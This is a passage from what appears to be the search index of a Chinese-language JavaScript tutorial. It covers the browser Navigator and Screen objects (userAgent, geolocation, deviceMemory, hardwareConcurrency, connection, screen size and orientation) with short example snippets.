\u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u53ef\u7528\u7684\u903b\u8f91\u5904\u7406\u5668\u5927\u4e8e4\uff0c\u624d\u4f1a\u52a0\u8f7d\u5927\u578b\u811a\u672c\u3002 \u8be5\u5c5e\u6027\u901a\u8fc7\u7528\u4e8e\u521b\u5efa Web Worker\uff0c\u6bcf\u4e2a\u53ef\u7528\u7684\u903b\u8f91\u5904\u7406\u5668\u90fd\u521b\u5efa\u4e00\u4e2a Worker\u3002 1 2 3 4 5 6 7 8 9 let workerList = []; for ( let i = 0 ; i < window . navigator . hardwareConcurrency ; i ++ ) { let newWorker = { worker : new Worker ( 'cpuworker.js' ), inUse : false }; workerList . push ( newWorker ); } \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u6709\u591a\u5c11\u4e2a\u53ef\u7528\u7684\u903b\u8f91\u5904\u7406\u5668\uff0c\u5c31\u521b\u5efa\u591a\u5c11\u4e2a Web Worker\u3002 Navigator.connection \u00b6 navigator.connection \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5305\u542b\u5f53\u524d\u7f51\u7edc\u8fde\u63a5\u7684\u76f8\u5173\u4fe1\u606f\u3002 downlink\uff1a\u6709\u6548\u5e26\u5bbd\u4f30\u8ba1\u503c\uff08\u5355\u4f4d\uff1a\u5146\u6bd4\u7279/\u79d2\uff0cMbps\uff09\uff0c\u56db\u820d\u4e94\u5165\u5230\u6bcf\u79d2 25KB \u7684\u6700\u63a5\u8fd1\u500d\u6570\u3002 downlinkMax\uff1a\u5f53\u524d\u8fde\u63a5\u7684\u6700\u5927\u4e0b\u884c\u94fe\u8def\u901f\u5ea6\uff08\u5355\u4f4d\uff1a\u5146\u6bd4\u7279\u6bcf\u79d2\uff0cMbps\uff09\u3002 effectiveType\uff1a\u8fd4\u56de\u8fde\u63a5\u7684\u7b49\u6548\u7c7b\u578b\uff0c\u53ef\u80fd\u7684\u503c\u4e3a slow-2g \u3001 2g \u3001 3g \u3001 4g \u3002 rtt\uff1a\u5f53\u524d\u8fde\u63a5\u7684\u4f30\u8ba1\u6709\u6548\u5f80\u8fd4\u65f6\u95f4\uff0c\u56db\u820d\u4e94\u5165\u5230\u6700\u63a5\u8fd1\u768425\u6beb\u79d2\u7684\u500d\u6570\u3002 saveData\uff1a\u7528\u6237\u662f\u5426\u8bbe\u7f6e\u4e86\u6d4f\u89c8\u5668\u7684\u51cf\u5c11\u6570\u636e\u4f7f\u7528\u91cf\u9009\u9879\uff08\u6bd4\u5982\u4e0d\u52a0\u8f7d\u56fe\u7247\uff09\uff0c\u8fd4\u56de true \u6216\u8005 false \u3002 type\uff1a\u5f53\u524d\u8fde\u63a5\u7684\u4ecb\u8d28\u7c7b\u578b\uff0c\u53ef\u80fd\u7684\u503c\u4e3a bluetooth \u3001 cellular \u3001 ethernet \u3001 none \u3001 wifi \u3001 wimax \u3001 other \u3001 unknown \u3002 1 2 3 if ( navigator . connection . effectiveType === '4g' ) { await import ( './costly-module.js' ); } \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u5982\u679c\u7f51\u7edc\u8fde\u63a5\u662f 4G\uff0c\u5219\u52a0\u8f7d\u5927\u578b\u811a\u672c\u3002 Screen \u5bf9\u8c61 \u00b6 Screen \u5bf9\u8c61\u8868\u793a\u5f53\u524d\u7a97\u53e3\u6240\u5728\u7684\u5c4f\u5e55\uff0c\u63d0\u4f9b\u663e\u793a\u8bbe\u5907\u7684\u4fe1\u606f\u3002 window.screen \u5c5e\u6027\u6307\u5411\u8fd9\u4e2a\u5bf9\u8c61\u3002 \u8be5\u5bf9\u8c61\u6709\u4e0b\u9762\u7684\u5c5e\u6027\u3002 Screen.height \uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u6240\u5728\u7684\u5c4f\u5e55\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u9664\u975e\u8c03\u6574\u663e\u793a\u5668\u7684\u5206\u8fa8\u7387\uff0c\u5426\u5219\u8fd9\u4e2a\u503c\u53ef\u4ee5\u770b\u4f5c\u5e38\u91cf\uff0c\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002\u663e\u793a\u5668\u7684\u5206\u8fa8\u7387\u4e0e\u6d4f\u89c8\u5668\u8bbe\u7f6e\u65e0\u5173\uff0c\u7f29\u653e\u7f51\u9875\u5e76\u4e0d\u4f1a\u6539\u53d8\u5206\u8fa8\u7387\u3002 Screen.width \uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u6240\u5728\u7684\u5c4f\u5e55\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 Screen.availHeight \uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u53ef\u7528\u7684\u5c4f\u5e55\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u56e0\u4e3a\u90e8\u5206\u7a7a\u95f4\u53ef\u80fd\u4e0d\u53ef\u7528\uff0c\u6bd4\u5982\u7cfb\u7edf\u7684\u4efb\u52a1\u680f\u6216\u8005 Mac \u7cfb\u7edf\u5c4f\u5e55\u5e95\u90e8\u7684 Dock \u533a\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7b49\u4e8e height \u51cf\u53bb\u90a3\u4e9b\u88ab\u7cfb\u7edf\u7ec4\u4ef6\u7684\u9ad8\u5ea6\u3002 Screen.availWidth \uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u53ef\u7528\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 Screen.pixelDepth \uff1a\u6574\u6570\uff0c\u8868\u793a\u5c4f\u5e55\u7684\u8272\u5f69\u4f4d\u6570\uff0c\u6bd4\u5982 24 \u8868\u793a\u5c4f\u5e55\u63d0\u4f9b24\u4f4d\u8272\u5f69\u3002 Screen.colorDepth \uff1a Screen.pixelDepth \u7684\u522b\u540d\u3002\u4e25\u683c\u5730\u8bf4\uff0ccolorDepth \u8868\u793a\u5e94\u7528\u7a0b\u5e8f\u7684\u989c\u8272\u6df1\u5ea6\uff0cpixelDepth \u8868\u793a\u5c4f\u5e55\u7684\u989c\u8272\u6df1\u5ea6\uff0c\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u90fd\u662f\u540c\u4e00\u4ef6\u4e8b\u3002 Screen.orientation \uff1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8868\u793a\u5c4f\u5e55\u7684\u65b9\u5411\u3002\u8be5\u5bf9\u8c61\u7684 type \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5c4f\u5e55\u7684\u5177\u4f53\u65b9\u5411\uff0c landscape-primary \u8868\u793a\u6a2a\u653e\uff0c landscape-secondary \u8868\u793a\u98a0\u5012\u7684\u6a2a\u653e\uff0c portrait-primary \u8868\u793a\u7ad6\u653e\uff0c portrait-secondary \u8868\u793a\u98a0\u5012\u7684\u7ad6\u653e\u3002 \u4e0b\u9762\u662f Screen.orientation \u7684\u4f8b\u5b50\u3002 1 2 window . screen . orientation // { angle: 0, type: \"landscape-primary\", onchange: null } \u4e0b\u9762\u7684\u4f8b\u5b50\u4fdd\u8bc1\u5c4f\u5e55\u5206\u8fa8\u7387\u5927\u4e8e 1024 x 768\u3002 1 2 3 if ( window . screen . width >= 1024 && window . screen . height >= 768 ) { // \u5206\u8fa8\u7387\u4e0d\u4f4e\u4e8e 1024x768 } \u4e0b\u9762\u662f\u6839\u636e\u5c4f\u5e55\u7684\u5bbd\u5ea6\uff0c\u5c06\u7528\u6237\u5bfc\u5411\u4e0d\u540c\u7f51\u9875\u7684\u4ee3\u7801\u3002 1 2 3 4 5 if (( screen . width <= 800 ) && ( screen . height <= 600 )) { window . location . replace ( 'small.html' ); } else { window . location . replace ( 'wide.html' ); }","title":"Navigator \u5bf9\u8c61\uff0cScreen \u5bf9\u8c61"},{"location":"bom/navigator/#navigator-screen","text":"window.navigator \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u5305\u542b\u6d4f\u89c8\u5668\u548c\u7cfb\u7edf\u4fe1\u606f\u7684 Navigator \u5bf9\u8c61\u3002\u811a\u672c\u901a\u8fc7\u8fd9\u4e2a\u5c5e\u6027\u4e86\u89e3\u7528\u6237\u7684\u73af\u5883\u4fe1\u606f\u3002","title":"Navigator \u5bf9\u8c61\uff0cScreen \u5bf9\u8c61\u3002"},{"location":"bom/navigator/#navigator","text":"","title":"Navigator \u5bf9\u8c61\u7684\u5c5e\u6027"},{"location":"bom/navigator/#navigatoruseragent","text":"navigator.userAgent \u5c5e\u6027\u8fd4\u56de\u6d4f\u89c8\u5668\u7684 User Agent \u5b57\u7b26\u4e32\uff0c\u8868\u793a\u7528\u6237\u8bbe\u5907\u4fe1\u606f\uff0c\u5305\u542b\u4e86\u6d4f\u89c8\u5668\u7684\u5382\u5546\u3001\u7248\u672c\u3001\u64cd\u4f5c\u7cfb\u7edf\u7b49\u4fe1\u606f\u3002 \u4e0b\u9762\u662f Chrome \u6d4f\u89c8\u5668\u7684 userAgent \u3002 1 2 navigator . userAgent // \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36\" \u901a\u8fc7 userAgent \u5c5e\u6027\u8bc6\u522b\u6d4f\u89c8\u5668\uff0c\u4e0d\u662f\u4e00\u4e2a\u597d\u529e\u6cd5\u3002\u56e0\u4e3a\u5fc5\u987b\u8003\u8651\u6240\u6709\u7684\u60c5\u51b5\uff08\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\uff0c\u4e0d\u540c\u7684\u7248\u672c\uff09\uff0c\u975e\u5e38\u9ebb\u70e6\uff0c\u800c\u4e14\u7528\u6237\u53ef\u4ee5\u6539\u53d8\u8fd9\u4e2a\u5b57\u7b26\u4e32\u3002\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7684\u683c\u5f0f\u5e76\u65e0\u7edf\u4e00\u89c4\u5b9a\uff0c\u4e5f\u65e0\u6cd5\u4fdd\u8bc1\u672a\u6765\u7684\u9002\u7528\u6027\uff0c\u5404\u79cd\u4e0a\u7f51\u8bbe\u5907\u5c42\u51fa\u4e0d\u7a77\uff0c\u96be\u4ee5\u7a77\u5c3d\u3002\u6240\u4ee5\uff0c\u73b0\u5728\u4e00\u822c\u4e0d\u518d\u901a\u8fc7\u5b83\u8bc6\u522b\u6d4f\u89c8\u5668\u4e86\uff0c\u800c\u662f\u4f7f\u7528\u201c\u529f\u80fd\u8bc6\u522b\u201d\u65b9\u6cd5\uff0c\u5373\u9010\u4e00\u6d4b\u8bd5\u5f53\u524d\u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301\u8981\u7528\u5230\u7684 JavaScript \u529f\u80fd\u3002 \u4e0d\u8fc7\uff0c\u901a\u8fc7 userAgent \u53ef\u4ee5\u5927\u81f4\u51c6\u786e\u5730\u8bc6\u522b\u624b\u673a\u6d4f\u89c8\u5668\uff0c\u65b9\u6cd5\u5c31\u662f\u6d4b\u8bd5\u662f\u5426\u5305\u542b mobi \u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 var ua = navigator . userAgent . toLowerCase (); if ( /mobi/ . test ( ua )) { // \u624b\u673a\u6d4f\u89c8\u5668 } else { // \u975e\u624b\u673a\u6d4f\u89c8\u5668 } \u5982\u679c\u60f3\u8981\u8bc6\u522b\u6240\u6709\u79fb\u52a8\u8bbe\u5907\u7684\u6d4f\u89c8\u5668\uff0c\u53ef\u4ee5\u6d4b\u8bd5\u66f4\u591a\u7684\u7279\u5f81\u5b57\u7b26\u4e32\u3002 1 /mobi|android|touch|mini/ . test ( ua )","title":"Navigator.userAgent"},{"location":"bom/navigator/#navigatorplugins","text":"Navigator.plugins \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f Plugin \u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u5b89\u88c5\u7684\u63d2\u4ef6\uff0c\u6bd4\u5982 Flash\u3001ActiveX \u7b49\u3002 1 2 3 4 5 6 7 8 var pluginsLength = navigator . plugins . length ; for ( var i = 0 ; i < pluginsLength ; i ++ ) { console . log ( navigator . plugins [ i ]. name ); console . log ( navigator . plugins [ i ]. filename ); console . log ( navigator . plugins [ i ]. description ); console . log ( navigator . plugins [ i ]. version ); }","title":"Navigator.plugins"},{"location":"bom/navigator/#navigatorplatform","text":"Navigator.platform \u5c5e\u6027\u8fd4\u56de\u7528\u6237\u7684\u64cd\u4f5c\u7cfb\u7edf\u4fe1\u606f\uff0c\u6bd4\u5982 MacIntel \u3001 Win32 \u3001 Linux x86_64 \u7b49 \u3002 1 2 navigator . platform // \"Linux x86_64\"","title":"Navigator.platform"},{"location":"bom/navigator/#navigatoronline","text":"navigator.onLine \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u5f53\u524d\u5728\u7ebf\u8fd8\u662f\u79bb\u7ebf\uff08\u6d4f\u89c8\u5668\u65ad\u7ebf\uff09\u3002 1 navigator . onLine // true \u6709\u65f6\uff0c\u6d4f\u89c8\u5668\u53ef\u4ee5\u8fde\u63a5\u5c40\u57df\u7f51\uff0c\u4f46\u662f\u5c40\u57df\u7f51\u4e0d\u80fd\u8fde\u901a\u5916\u7f51\u3002\u8fd9\u65f6\uff0c\u6709\u7684\u6d4f\u89c8\u5668\u7684 onLine \u5c5e\u6027\u4f1a\u8fd4\u56de true \uff0c\u6240\u4ee5\u4e0d\u80fd\u5047\u5b9a\u53ea\u8981\u662f true \uff0c\u7528\u6237\u5c31\u4e00\u5b9a\u80fd\u8bbf\u95ee\u4e92\u8054\u7f51\u3002\u4e0d\u8fc7\uff0c\u5982\u679c\u662f false \uff0c\u53ef\u4ee5\u65ad\u5b9a\u7528\u6237\u4e00\u5b9a\u79bb\u7ebf\u3002 \u7528\u6237\u53d8\u6210\u5728\u7ebf\u4f1a\u89e6\u53d1 online \u4e8b\u4ef6\uff0c\u53d8\u6210\u79bb\u7ebf\u4f1a\u89e6\u53d1 offline \u4e8b\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7 window.ononline \u548c window.onoffline \u6307\u5b9a\u8fd9\u4e24\u4e2a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 window . addEventListener ( 'offline' , function ( e ) { console . log ( 'offline' ); }); window . addEventListener ( 'online' , function ( e ) { console . log ( 'online' ); });","title":"Navigator.onLine"},{"location":"bom/navigator/#navigatorlanguagenavigatorlanguages","text":"Navigator.language \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u7684\u9996\u9009\u8bed\u8a00\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 navigator . language // \"en\" Navigator.languages \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u8868\u793a\u7528\u6237\u53ef\u4ee5\u63a5\u53d7\u7684\u8bed\u8a00\u3002 Navigator.language \u603b\u662f\u8fd9\u4e2a\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\u3002HTTP \u8bf7\u6c42\u5934\u4fe1\u606f\u7684 Accept-Language \u5b57\u6bb5\uff0c\u5c31\u6765\u81ea\u8fd9\u4e2a\u6570\u7ec4\u3002 1 navigator . languages // [\"en-US\", \"en\", \"zh-CN\", \"zh\", \"zh-TW\"] \u5982\u679c\u8fd9\u4e2a\u5c5e\u6027\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u4f1a\u5728 window \u5bf9\u8c61\u4e0a\u89e6\u53d1 languagechange \u4e8b\u4ef6\u3002","title":"Navigator.language\uff0cNavigator.languages"},{"location":"bom/navigator/#navigatorgeolocation","text":"Navigator.geolocation \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a Geolocation \u5bf9\u8c61\uff0c\u5305\u542b\u7528\u6237\u5730\u7406\u4f4d\u7f6e\u7684\u4fe1\u606f\u3002\u6ce8\u610f\uff0c\u8be5 API \u53ea\u6709\u5728 HTTPS \u534f\u8bae\u4e0b\u53ef\u7528\uff0c\u5426\u5219\u8c03\u7528\u4e0b\u9762\u65b9\u6cd5\u65f6\u4f1a\u62a5\u9519\u3002 Geolocation \u5bf9\u8c61\u63d0\u4f9b\u4e0b\u9762\u4e09\u4e2a\u65b9\u6cd5\u3002 Geolocation.getCurrentPosition()\uff1a\u5f97\u5230\u7528\u6237\u7684\u5f53\u524d\u4f4d\u7f6e Geolocation.watchPosition()\uff1a\u76d1\u542c\u7528\u6237\u4f4d\u7f6e\u53d8\u5316 Geolocation.clearWatch()\uff1a\u53d6\u6d88 watchPosition() \u65b9\u6cd5\u6307\u5b9a\u7684\u76d1\u542c\u51fd\u6570 \u6ce8\u610f\uff0c\u8c03\u7528\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u8df3\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u8981\u6c42\u7528\u6237\u7ed9\u4e88\u6388\u6743\u3002","title":"Navigator.geolocation"},{"location":"bom/navigator/#navigatorcookieenabled","text":"navigator.cookieEnabled \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u7684 Cookie \u529f\u80fd\u662f\u5426\u6253\u5f00\u3002 1 navigator . cookieEnabled // true \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5c5e\u6027\u53cd\u6620\u7684\u662f\u6d4f\u89c8\u5668\u603b\u7684\u7279\u6027\uff0c\u4e0e\u662f\u5426\u50a8\u5b58\u67d0\u4e2a\u5177\u4f53\u7684\u7f51\u7ad9\u7684 Cookie \u65e0\u5173\u3002\u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u67d0\u4e2a\u7f51\u7ad9\u4e0d\u5f97\u50a8\u5b58 Cookie\uff0c\u8fd9\u65f6 cookieEnabled \u8fd4\u56de\u7684\u8fd8\u662f true \u3002","title":"Navigator.cookieEnabled"},{"location":"bom/navigator/#navigator_1","text":"","title":"Navigator \u5bf9\u8c61\u7684\u65b9\u6cd5"},{"location":"bom/navigator/#navigatorjavaenabled","text":"navigator.javaEnabled() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u80fd\u8fd0\u884c Java Applet \u5c0f\u7a0b\u5e8f\u3002 1 navigator . javaEnabled () // false","title":"Navigator.javaEnabled()"},{"location":"bom/navigator/#navigatorsendbeacon","text":"Navigator.sendBeacon() \u65b9\u6cd5\u7528\u4e8e\u5411\u670d\u52a1\u5668\u5f02\u6b65\u53d1\u9001\u6570\u636e\uff0c\u8be6\u89c1\u300aXMLHttpRequest \u5bf9\u8c61\u300b\u4e00\u7ae0\u3002","title":"Navigator.sendBeacon()"},{"location":"bom/navigator/#navigator_2","text":"Navigator \u5bf9\u8c61\u6709\u4e00\u4e9b\u5b9e\u9a8c\u6027\u5c5e\u6027\uff0c\u5728\u90e8\u5206\u6d4f\u89c8\u5668\u53ef\u7528\u3002","title":"Navigator \u7684\u5b9e\u9a8c\u6027\u5c5e\u6027"},{"location":"bom/navigator/#navigatordevicememory","text":"navigator.deviceMemory \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8ba1\u7b97\u673a\u7684\u5185\u5b58\u6570\u91cf\uff08\u5355\u4f4d\u4e3a GB\uff09\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u53ea\u5728 HTTPS \u73af\u5883\u4e0b\u53ef\u7528\u3002 \u5b83\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u8fd1\u4f3c\u503c\uff0c\u56db\u820d\u4e94\u5165\u5230\u6700\u63a5\u8fd1\u76842\u7684\u5e42\uff0c\u901a\u5e38\u662f 0.25\u30010.5\u30011\u30012\u30014\u30018\u3002\u5b9e\u9645\u5185\u5b58\u8d85\u8fc7 8GB\uff0c\u4e5f\u8fd4\u56de 8 \u3002 1 2 3 if ( navigator . deviceMemory > 1 ) { await import ( './costly-module.js' ); } \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u53ea\u6709\u5f53\u524d\u5185\u5b58\u5927\u4e8e 1GB\uff0c\u624d\u52a0\u8f7d\u5927\u578b\u7684\u811a\u672c\u3002","title":"Navigator.deviceMemory"},{"location":"bom/navigator/#navigatorhardwareconcurrency","text":"navigator.hardwareConcurrency \u5c5e\u6027\u8fd4\u56de\u7528\u6237\u8ba1\u7b97\u673a\u4e0a\u53ef\u7528\u7684\u903b\u8f91\u5904\u7406\u5668\u7684\u6570\u91cf\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u73b0\u4ee3\u8ba1\u7b97\u673a\u7684 CPU \u6709\u591a\u4e2a\u7269\u7406\u6838\u5fc3\uff0c\u6bcf\u4e2a\u7269\u7406\u6838\u5fc3\u6709\u65f6\u652f\u6301\u4e00\u6b21\u8fd0\u884c\u591a\u4e2a\u7ebf\u7a0b\u3002\u56e0\u6b64\uff0c\u56db\u6838 CPU \u53ef\u4ee5\u63d0\u4f9b\u516b\u4e2a\u903b\u8f91\u5904\u7406\u5668\u6838\u5fc3\u3002 1 2 3 if ( navigator . hardwareConcurrency > 4 ) { await import ( './costly-module.js' ); } \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u53ef\u7528\u7684\u903b\u8f91\u5904\u7406\u5668\u5927\u4e8e4\uff0c\u624d\u4f1a\u52a0\u8f7d\u5927\u578b\u811a\u672c\u3002 \u8be5\u5c5e\u6027\u901a\u8fc7\u7528\u4e8e\u521b\u5efa Web Worker\uff0c\u6bcf\u4e2a\u53ef\u7528\u7684\u903b\u8f91\u5904\u7406\u5668\u90fd\u521b\u5efa\u4e00\u4e2a Worker\u3002 1 2 3 4 5 6 7 8 9 let workerList = []; for ( let i = 0 ; i < window . navigator . hardwareConcurrency ; i ++ ) { let newWorker = { worker : new Worker ( 'cpuworker.js' ), inUse : false }; workerList . push ( newWorker ); } \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u6709\u591a\u5c11\u4e2a\u53ef\u7528\u7684\u903b\u8f91\u5904\u7406\u5668\uff0c\u5c31\u521b\u5efa\u591a\u5c11\u4e2a Web Worker\u3002","title":"Navigator.hardwareConcurrency"},{"location":"bom/navigator/#navigatorconnection","text":"navigator.connection \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5305\u542b\u5f53\u524d\u7f51\u7edc\u8fde\u63a5\u7684\u76f8\u5173\u4fe1\u606f\u3002 downlink\uff1a\u6709\u6548\u5e26\u5bbd\u4f30\u8ba1\u503c\uff08\u5355\u4f4d\uff1a\u5146\u6bd4\u7279/\u79d2\uff0cMbps\uff09\uff0c\u56db\u820d\u4e94\u5165\u5230\u6bcf\u79d2 25KB \u7684\u6700\u63a5\u8fd1\u500d\u6570\u3002 downlinkMax\uff1a\u5f53\u524d\u8fde\u63a5\u7684\u6700\u5927\u4e0b\u884c\u94fe\u8def\u901f\u5ea6\uff08\u5355\u4f4d\uff1a\u5146\u6bd4\u7279\u6bcf\u79d2\uff0cMbps\uff09\u3002 effectiveType\uff1a\u8fd4\u56de\u8fde\u63a5\u7684\u7b49\u6548\u7c7b\u578b\uff0c\u53ef\u80fd\u7684\u503c\u4e3a slow-2g \u3001 2g \u3001 3g \u3001 4g \u3002 rtt\uff1a\u5f53\u524d\u8fde\u63a5\u7684\u4f30\u8ba1\u6709\u6548\u5f80\u8fd4\u65f6\u95f4\uff0c\u56db\u820d\u4e94\u5165\u5230\u6700\u63a5\u8fd1\u768425\u6beb\u79d2\u7684\u500d\u6570\u3002 saveData\uff1a\u7528\u6237\u662f\u5426\u8bbe\u7f6e\u4e86\u6d4f\u89c8\u5668\u7684\u51cf\u5c11\u6570\u636e\u4f7f\u7528\u91cf\u9009\u9879\uff08\u6bd4\u5982\u4e0d\u52a0\u8f7d\u56fe\u7247\uff09\uff0c\u8fd4\u56de true \u6216\u8005 false \u3002 type\uff1a\u5f53\u524d\u8fde\u63a5\u7684\u4ecb\u8d28\u7c7b\u578b\uff0c\u53ef\u80fd\u7684\u503c\u4e3a bluetooth \u3001 cellular \u3001 ethernet \u3001 none \u3001 wifi \u3001 wimax \u3001 other \u3001 unknown \u3002 1 2 3 if ( navigator . connection . effectiveType === '4g' ) { await import ( './costly-module.js' ); } \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u5982\u679c\u7f51\u7edc\u8fde\u63a5\u662f 4G\uff0c\u5219\u52a0\u8f7d\u5927\u578b\u811a\u672c\u3002","title":"Navigator.connection"},{"location":"bom/navigator/#screen","text":"Screen \u5bf9\u8c61\u8868\u793a\u5f53\u524d\u7a97\u53e3\u6240\u5728\u7684\u5c4f\u5e55\uff0c\u63d0\u4f9b\u663e\u793a\u8bbe\u5907\u7684\u4fe1\u606f\u3002 window.screen \u5c5e\u6027\u6307\u5411\u8fd9\u4e2a\u5bf9\u8c61\u3002 \u8be5\u5bf9\u8c61\u6709\u4e0b\u9762\u7684\u5c5e\u6027\u3002 Screen.height \uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u6240\u5728\u7684\u5c4f\u5e55\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u9664\u975e\u8c03\u6574\u663e\u793a\u5668\u7684\u5206\u8fa8\u7387\uff0c\u5426\u5219\u8fd9\u4e2a\u503c\u53ef\u4ee5\u770b\u4f5c\u5e38\u91cf\uff0c\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002\u663e\u793a\u5668\u7684\u5206\u8fa8\u7387\u4e0e\u6d4f\u89c8\u5668\u8bbe\u7f6e\u65e0\u5173\uff0c\u7f29\u653e\u7f51\u9875\u5e76\u4e0d\u4f1a\u6539\u53d8\u5206\u8fa8\u7387\u3002 Screen.width \uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u6240\u5728\u7684\u5c4f\u5e55\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 Screen.availHeight \uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u53ef\u7528\u7684\u5c4f\u5e55\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u56e0\u4e3a\u90e8\u5206\u7a7a\u95f4\u53ef\u80fd\u4e0d\u53ef\u7528\uff0c\u6bd4\u5982\u7cfb\u7edf\u7684\u4efb\u52a1\u680f\u6216\u8005 Mac \u7cfb\u7edf\u5c4f\u5e55\u5e95\u90e8\u7684 Dock \u533a\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7b49\u4e8e height \u51cf\u53bb\u90a3\u4e9b\u88ab\u7cfb\u7edf\u7ec4\u4ef6\u7684\u9ad8\u5ea6\u3002 Screen.availWidth \uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u53ef\u7528\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002 Screen.pixelDepth \uff1a\u6574\u6570\uff0c\u8868\u793a\u5c4f\u5e55\u7684\u8272\u5f69\u4f4d\u6570\uff0c\u6bd4\u5982 24 \u8868\u793a\u5c4f\u5e55\u63d0\u4f9b24\u4f4d\u8272\u5f69\u3002 Screen.colorDepth \uff1a Screen.pixelDepth \u7684\u522b\u540d\u3002\u4e25\u683c\u5730\u8bf4\uff0ccolorDepth \u8868\u793a\u5e94\u7528\u7a0b\u5e8f\u7684\u989c\u8272\u6df1\u5ea6\uff0cpixelDepth \u8868\u793a\u5c4f\u5e55\u7684\u989c\u8272\u6df1\u5ea6\uff0c\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u90fd\u662f\u540c\u4e00\u4ef6\u4e8b\u3002 Screen.orientation \uff1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8868\u793a\u5c4f\u5e55\u7684\u65b9\u5411\u3002\u8be5\u5bf9\u8c61\u7684 type \u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5c4f\u5e55\u7684\u5177\u4f53\u65b9\u5411\uff0c landscape-primary \u8868\u793a\u6a2a\u653e\uff0c landscape-secondary \u8868\u793a\u98a0\u5012\u7684\u6a2a\u653e\uff0c portrait-primary \u8868\u793a\u7ad6\u653e\uff0c portrait-secondary \u8868\u793a\u98a0\u5012\u7684\u7ad6\u653e\u3002 \u4e0b\u9762\u662f Screen.orientation \u7684\u4f8b\u5b50\u3002 1 2 window . screen . orientation // { angle: 0, type: \"landscape-primary\", onchange: null } \u4e0b\u9762\u7684\u4f8b\u5b50\u4fdd\u8bc1\u5c4f\u5e55\u5206\u8fa8\u7387\u5927\u4e8e 1024 x 768\u3002 1 2 3 if ( window . screen . width >= 1024 && window . screen . height >= 768 ) { // \u5206\u8fa8\u7387\u4e0d\u4f4e\u4e8e 1024x768 } 